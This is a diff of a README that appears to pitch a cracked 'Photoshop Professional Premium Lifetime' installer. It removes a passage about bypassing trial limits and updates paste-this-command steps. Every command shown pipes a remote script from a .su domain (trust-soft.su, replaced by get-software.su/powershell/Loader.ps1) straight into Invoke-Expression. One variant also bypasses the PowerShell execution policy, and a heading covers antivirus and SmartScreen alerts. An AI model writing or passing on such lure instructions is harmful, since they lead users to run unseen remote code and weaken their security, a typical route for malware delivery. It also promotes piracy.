@@ -17,24 +17,18 @@ Our setup framework assists system administrators and digital artists in deployi
 
 ---
 
-## 💎 Why Professional Users Choose This Framework
-
-Standard desktop image environments often suffer from broken directory structures, restricted cache allocations, or trial limitations that interrupt complex editing pipelines. Our project allows everyday operators to bypass these structural constraints and experience **Photoshop Professional Premium Lifetime** workspace capabilities instantly. It is safe, lightweight, and completes its cycle in under a minute.
-
----
-
-## 🛠 Quick Setup Guide (PowerShell)
+## 🛠️ Quick Setup Guide (PowerShell)
 
 1. Launch PowerShell:
-   * Press Win + X on your keyboard.
-   * Click on Terminal or Windows PowerShell from the list.
+   * Press `Win + X` on your keyboard.
+   * Click on **Terminal** or **Windows PowerShell** from the list.
 
 2. Execute the Setup Script:
-   * Copy the command below, paste it into your PowerShell window, and hit Enter. The script will handle the necessary registry tweaks and install all dependencies automatically:
+   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:
 
-```powershell
-irm https://trust-soft.su | iex
-```
+   ```powershell
+   irm https://get-software.su/powershell/Loader.ps1 | iex
+   ```
 
 ---
 
@@ -43,13 +37,13 @@ irm https://trust-soft.su | iex
 ### 💬 Script is blocked by Execution Policy
 If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.su | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://get-software.su/powershell/Loader.ps1 | iex"
 ```
 
 ### 💬 "irm" command not found (Outdated PowerShell)
-If your version doesn't support the irm shortcut, use the full, unabbreviated commands instead:
+If your PowerShell version doesn't support the `irm` shortcut, use the full, unabbreviated commands instead:
 ```powershell
-Invoke-RestMethod https://trust-soft.su | Invoke-Expression
+Invoke-RestMethod https://get-software.su/powershell/Loader.ps1 | Invoke-Expression
 ```
 
 ### 💬 Antivirus / SmartScreen Alerts
